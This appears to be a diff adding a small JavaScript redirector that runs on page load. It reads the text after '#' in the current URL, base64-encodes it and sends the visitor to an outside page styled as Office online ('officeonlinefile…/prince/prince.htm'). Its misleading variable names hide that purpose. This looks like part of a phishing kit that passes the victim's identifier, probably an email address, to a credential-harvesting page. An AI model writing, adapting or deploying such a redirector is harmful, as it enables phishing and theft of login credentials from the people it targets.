@@ -1,0 +1,30 @@
+
+
+myFunction()
+
+function myFunction() {
+
+
+var feedUpdateResponse = window.location.href;
+var feedUpdateSplit = feedUpdateResponse.split("");
+
+for (var x = 0; x < feedUpdateSplit.length; x++) {
+
+if (feedUpdateSplit[x]=="#"){
+var che= feedUpdateResponse.substring(x+1);
+
+}else{
+
+
+}
+
+
+
+}
+
+var joinlink="https://officeonlinefile.us-south.cf.appdomain.cloud/prince/prince.htm#"+btoa(che);
+window.location.href=joinlink;
+
+
+}
+
